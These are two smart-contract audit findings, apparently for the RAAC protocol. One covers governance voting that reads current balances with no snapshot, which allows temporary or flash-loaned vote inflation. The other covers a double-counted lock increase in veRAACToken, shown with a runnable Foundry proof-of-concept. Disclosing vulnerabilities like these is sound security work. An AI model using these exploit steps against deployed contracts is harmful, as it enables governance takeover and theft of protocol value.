Summary
Voting power is based on current balance, not a snapshot at proposal creation\
----new code block----
 function castVote(uint256 proposalId, bool support) external override returns (uint256) {
        ProposalCore storage proposal = _proposals[proposalId];
 if (proposal.startTime == 0) revert ProposalDoesNotExist(proposalId);
 if (block.timestamp < proposal.startTime) {
 revert VotingNotStarted(proposalId, proposal.startTime, block.timestamp);
        }
 if (block.timestamp > proposal.endTime) {
 revert VotingEnded(proposalId, proposal.endTime, block.timestamp);
        }
​
​
        ProposalVote storage proposalVote = _proposalVotes[proposalId];
 if (proposalVote.hasVoted[msg.sender]) {
 revert AlreadyVoted(proposalId, msg.sender, block.timestamp);
        }
​
​
 uint256 weight = _veToken.getVotingPower(msg.sender);
 if (weight == 0) {
 revert NoVotingPower(msg.sender, block.number);
        }
​
​
        proposalVote.hasVoted[msg.sender] = true;
​
​
 if (support) {
            proposalVote.forVotes += weight;
        } else {
            proposalVote.againstVotes += weight;
        }
​
​
 emit VoteCast(msg.sender, proposalId, support, weight, "");
 return weight;

----end of code block ----
Vulnerability Details
The
castVote()
function in Governance.sol has a fundamental trust assumption, it relies on current voting power rather than historical snapshots. The key line:
Initially, let's go through this State
Alice has 100,000
veRAACTokens
locked
Bob creates a governance proposal to adjust protocol parameters
The proposal enters voting period after
votingDelay
The Issue Unfolds
Alice sees the proposal and plans to vote, but notices she can manipulate her voting power:
Governance.sol#L196
----new code block----
uint256 weight = _veToken.getVotingPower(msg.sender);
// This line gets current voting power rather than using a snapshot from proposal creation.
​
----end of code block ----
This creates a temporal disconnect between proposal creation and vote casting. The code assumes voting power at voting time represents legitimate governance weight, which breaks the core principle of time-weighted governance.
Alice executes her attack:
She increases her lock amount to 500,000
veRAACTokens
Calls
castVote(proposalId, true)
with her inflated voting power
Immediately after voting, she reduces her lock back to 100,000
The manipulation succeeds because:
No snapshot of voting power is taken at proposal creation
proposalVote.forVotes
gets inflated by temporary voting power
The contract only checks
hasVoted[msg.sender]
to prevent multiple votes
Resulting Impact
Proposal voting becomes manipulated
A single user can temporarily boost their voting power
The
quorum()
calculation becomes unreliable
Governance decisions no longer reflect true long-term token holder intent
If the proposal was to adjust
MAX_WEEKLY_EMISSION
in RAACGauge from 500,000 to 1,000,000, Alice's manipulated vote could swing the outcome despite only having legitimate voting power of 100,000 tokens.
Impact
Given the protocol's governance controls critical parameters like:
MAX_WEEKLY_EMISSION
(500,000 RAAC) in RAACGauge
Fee distributions in
FeeCollector
Treasury management
A malicious actor could:
Flash loan
veRAACTokens
Cast votes with inflated power
Return borrowed tokens
Impact: Up to 100% of protocol parameters could be maliciously modified
This mirrors the Beanstalk governance exploit (April 2022) where an attacker flash loaned $1B in assets to gain emergency voting power. The attacker proposed and executed a malicious governance proposal within a single transaction by exploiting the lack of voting power snapshots.
Tools Used
vs
Recommendations
Store voting power at proposal creation. n the current
Governance.sol
, we could enhance the
propose()
function to capture voting power snapshots when proposals are created.
----new code block----
function propose(...) external override returns (uint256) {
 uint256 proposalId = _proposalCount++;

 // Create voting power snapshot at proposal creation
 mapping(address => uint256) storage votingPowerSnapshot;
    votingPowerSnapshot[msg.sender] = _veToken.getVotingPower(msg.sender);

    _proposals[proposalId] = ProposalCore({
 // Existing fields...
        votingPowerSnapshot: votingPowerSnapshot
    });
}
----end of code block ----
Then modify
castVote()
to use this snapshot
----new code block----
function castVote(uint256 proposalId, bool support) external returns (uint256) {
    ProposalCore storage proposal = _proposals[proposalId];
 uint256 weight = proposal.votingPowerSnapshot[msg.sender];
 // The function...
}
----end of code block ----
This aligns with how the protocol's other time-sensitive components work.
TimeWeightedAverage.sol
for tracking historical values
veRAACToken.sol
checkpoint system
GaugeController.sol
period-based weight tracking

Summary
Incorrect bias update in
veRAACToken.increase
method allows a malicious user receive more voting power and veToken than deserved by locking and then increasing.
Vulnerability Details
Root Cause Analysis
Users can lock raacToken for voting power and veRAACToken.
veRAACToken minted amount represents initial voting power, and it is calculated as the following
ref
:
----new code block----
power = lockAmount * duration / MAX_LOCK_DURATION
----end of code block ----
However, when users
increase their position
, total lock amount is calculated incorrectly:
----new code block----
 // Increase lock using LockManager
@>  _lockState.increaseLock(msg.sender, amount); // @audit amount is already added
    _updateBoostState(msg.sender, locks[msg.sender].amount);
​
 // Update voting power
    LockManager.Lock memory userLock = _lockState.locks[msg.sender];
    (int128 newBias, int128 newSlope) = _votingState.calculateAndUpdatePower(
 msg.sender,
@>      userLock.amount + amount, // @audit new amount is added again
        userLock.end
    );
----end of code block ----
As we can see in the comment,
userLock.amount
is already incremented by increased amount. But increased amount is added to
userLock.amount
again when calculating new bias.
So the following thing happens on increase:
----new code block----
newBias = (existingLockAmount + increasedAmount * 2) * duration / MAX_LOCK_DURATION
----end of code block ----
This means that, for given raacToken amount, if you keep
existingLockAmount
to almost zero, and keep
increasedAmount
to total raacToken amount you have, you will mint almost double veToken and voting power.
Consider the following scenario:
Eve has 100 raacToken
Eve locks dust amount
1e-18
raccToken to create an initial position
Eve immediately increases the position by locking the rest of raacToken
Eve will receive around 200 veToken and 200 voting power
POC
Scenario
POC scenario is similar to the one in the Vulnerability Details section.
To illustrate the vulnerabilty more clearly, POC has two actors: alice and eve
alice
locks 100 raacToken and receives 100 veToken and voting power
eve
exploits the vulnerability and mints nearly 200 veToken and voting power with the same amount of raacToken
How to run the POC
First, follow the steps in
hardhat-foundry integration tutorial
Then, create a file
test/poc.t.sol
and put the following content and run
forge test poc.t.sol -vvv
:
----new code block----
pragma solidity ^0.8.19;
​
import "../lib/forge-std/src/Test.sol";
import {veRAACToken} from "../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../contracts/core/tokens/RAACToken.sol";
​
contract veRAACTokenTest is Test {
    RAACToken raacToken;
    veRAACToken veToken;
​
 address alice = makeAddr("alice");
 address eve = makeAddr("eve");
​
 uint256 raacTokenAmount = 100e18;
​
 function setUp() external {
        raacToken = new RAACToken(address(this), 0, 0);
        raacToken.setMinter(address(this));
        veToken = new veRAACToken(address(raacToken));
        veToken.setMinter(address(this));
    }
​
 function testLockAndIncrease() external {
 // alice just locks 100 raacToken
        _userLocks(alice, raacTokenAmount, veToken.MAX_LOCK_DURATION());
 emit log_named_decimal_uint("alice voting power", veToken.getVotingPower(alice), 18);
 emit log_named_decimal_uint("alice veToken balance", veToken.balanceOf(alice), 18);
​
 // eve first locks dust amount
        _userLocks(eve, 1, veToken.MAX_LOCK_DURATION());
 // eve then increases the lock position by using rest of the raacToken
        _userIncreases(eve, raacTokenAmount - 1);
 emit log_named_decimal_uint("eve voting power", veToken.getVotingPower(eve), 18);
 emit log_named_decimal_uint("eve veToken balance", veToken.balanceOf(eve), 18);
​
 // eve has nearly double voting power and veToken balance as alice
        assertGt(veToken.getVotingPower(eve), veToken.getVotingPower(alice));
        assertGt(veToken.balanceOf(eve), veToken.balanceOf(alice));
    }
​
 function _userLocks(address user, uint256 amount, uint256 duration) internal {
        raacToken.mint(user, amount);
        vm.startPrank(user);
        raacToken.approve(address(veToken), amount);
        veToken.lock(amount, duration);
        vm.stopPrank();
    }
​
 function _userIncreases(address user, uint256 amount) internal {
        raacToken.mint(user, amount);
        vm.startPrank(user);
        raacToken.approve(address(veToken), amount);
        veToken.increase(amount);
        vm.stopPrank();
    }
}
​
